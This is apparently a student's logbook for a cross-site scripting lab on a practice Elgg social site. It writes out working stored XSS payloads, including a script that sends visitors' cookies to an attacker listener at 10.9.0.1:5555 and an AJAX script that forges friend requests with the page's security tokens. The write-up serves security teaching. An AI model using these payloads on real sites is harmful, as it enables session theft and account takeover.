### Logbook 10

#### Task 1

In this logbook we are focusing on exploiting XSS vulnerabilities.

Firstly we simply want to inject JavaScript code so that something happens when visiting another person's profile, for example, popping up an alert window. This can be done by inputting

```js 
<script>alert('XSS');</script>
```

in the "brief description" section of the profile.

#### Task 2

The second task is similar to the first but now we want to show the user's cookies.

Inputting

```js 
<script>alert(document.cookie);</script>
```

in the "brief description" section pops that alert with the cookies.

#### Task 3

To send the cookies to an attacker we can try to load an image with a given address in the "src" attribute, which will send a forged GET request to the attacker, given that they are listening on that same IP address. 

Therefore, inputting 

```js 
<script>document.write(’<img src=http://10.9.0.1:5555?c=’ + escape(document.cookie) + ’ >’); </script>
```

sends the user's cookies.

#### Task 4

In this task we're asked to become the target's friend.

Observing the HTTP requests that are sent when a user tries to add another as a friend, we can observe how it's constructed and we can forge a similar request.

This way, we can conclude that we would need to send a GET request with the following structure: `http://www.seed-server.com/action/friends/add?friend=<internal_id>+<timestamp><token><timestamp><token>`

So adding

```js 
<script type="text/javascript">
window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;

    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```

in the "About Me" section of the profile will send the friendship request correctly to Samy if any user visits their page.

#### Question 1: 

Those lines are needed so that others cannot send requests as someone else. This security measure avoids impersonations and it needs to happen this way because we don't want to need to prove our identity, for example, by sending login credentials on the request.

#### Question 2: 

Yes, by editing the code with the browser's dev tools and removing the <p> elements, we can write in the box exactly the script that we need. We can conclude that the script is working by visiting Samy's profiles as another user, which doesn't seem to do anything, but refreshing the page shows a change in the button from "Add Friend" to "Remove friend".
